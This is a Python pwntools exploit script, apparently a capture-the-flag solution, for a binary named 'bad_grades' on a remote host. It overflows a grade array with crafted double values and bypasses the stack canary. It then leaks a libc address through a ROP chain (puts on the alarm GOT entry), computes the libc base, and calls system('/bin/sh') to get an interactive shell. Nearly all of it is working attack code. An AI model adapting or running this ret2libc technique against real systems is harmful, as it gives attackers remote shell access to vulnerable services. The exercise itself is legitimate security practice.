#!/usr/bin/python3

from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split

elf 				= ELF('./bad_grades', checksec = False)
libc 				= ELF('./libc.so.6', checksec = False)
# ld 					= ELF("./ld-2.27.so", checksec = False)

context.terminal = ['tmux', 'splitw', '-h', '-p', '60', '-I']
context.binary = elf
context.log_level 	= "info"

gs = '''
break *0x004011c1
break *0x004010cc
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug(elf.path, gdbscript=gs)
	else:
		return process([elf.path])

def hex_to_double(val):
    # we need to make sure it is 8 bytes so use 64bits packer
    val = p64(val).hex()
    # print(val) # debug to see if there is "0x" infront
    # return in double (little endian)
    val = struct.unpack('d', bytes.fromhex(val))[0]
 
    # our input must be in string when sending over to the server
    return str(val)

def string_to_double(val):
    # Convert the string to bytes
    val_bytes = val
    
    # Pad the bytes to 8 bytes (64 bits) if needed
    if len(val_bytes) < 8:
        val_bytes += b'\x00' * (8 - len(val_bytes))
    elif len(val_bytes) > 8:
        val_bytes = val_bytes[:8]

    # Convert the bytes to a double (little endian)
    double_val = struct.unpack('<d', val_bytes)[0]
    
    # Convert the double value to string
    return str(double_val)
		
def find_ip_offset(payload):

    iterations = 36
    io = start_local(False)
    io.recv()
    io.sendline(b"2")
    io.recv()
    io.sendline(str(iterations).encode())
    print(io.recv())

    for i in range(0,33):
        io.sendline(b"1")
        print(io.recv())
	
    io.sendline(b".") # <-- canary
    print(io.recv())
    io.sendline(b".") # <-- I dont care about rbp
    print(io.recv())
    io.sendline(string_to_double(payload)) # <-- Is this RIP?
    # print(io.recv())

    # and here comes RIP which should go to RSP
 
    # io.sendlineafter(b": ", payload)
    io.wait()
	
    #ip_offset = cyclic_find(io.corefile.pc) # x86
    ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
    info("Located RIP offset at [{}]".format(ip_offset))
    return ip_offset

def exc_fmt(payload):
	io.sendlineafter(b"> ", b"11")
	io.sendlineafter(b">> ", payload)
	io.info(f"format string payload {payload} sent with length: {len(payload)}") 
	return io.recvline()

def generate_payload_aligned(rop):
    payload1 = OFFSET + rop
    if (len(payload1) % 16) == 0:
        return payload1
    
    else:
        payload2 = OFFSET + p64(RET) + rop
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1	
	
#f = FmtStr(exc_fmt, offset=5)
#f.write(binary_printf_got, libc_system)
#f.execute_writes()
	
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================
# ip_offset = find_ip_offset(cyclic(400))

######## REMOTE ########
io = remote("143.110.169.131", 32083)

######## LOCAL ########
# io = start_local(False)

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0] #0x0000000000401263
ret = rop.find_gadget(["ret"])[0] #0x0000000000400666
puts_plt = elf.plt.puts
alarm_got = elf.got.alarm
libc_alarm = libc.symbols.alarm

success(f"{hex(pop_rdi)=}")
success(f"{hex(ret)=}")
success(f"{hex(puts_plt)=}")
success(f"{hex(alarm_got)=}")
success(f"{hex(libc_alarm)=}")

iterations = 39
io.recv()
io.sendline(b"2")
io.recv()
io.sendline(str(iterations).encode())

for i in range(0,33):
    io.sendline(b"1")

io.sendline(b".") # <-- canary
io.sendline(b"2") # <-- I dont care about rbp
io.sendline(hex_to_double(pop_rdi).encode()) # RIP
io.sendline(hex_to_double(alarm_got).encode())
io.sendline(hex_to_double(puts_plt).encode())
io.sendline(hex_to_double(0x00400fd5).encode())

io.recvuntil(b"\n")
libc_leak = io.recvuntil(b"\n").strip()
print(f"{libc_leak=}")
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
print(f"{hex(libc_leak)=}")
libc.address = libc_leak - libc_alarm
print(f"{hex(libc.address)=}")


libc_sh = next(libc.search(b'/bin/sh'))
libc_system = libc.symbols.system
success(f"{hex(libc_sh)=}")
success(f"{hex(libc_system)=}")

io.sendline(str(iterations).encode())
for i in range(0,33):
    io.sendline(b"2")

io.sendline(b".") # <-- canary
io.sendline(b"2") # <-- I dont care about rbp
io.sendline(hex_to_double(ret).encode())
io.sendline(hex_to_double(pop_rdi).encode()) # RIP
io.sendline(hex_to_double(libc_sh).encode())
io.sendline(hex_to_double(libc_system).encode())


io.interactive()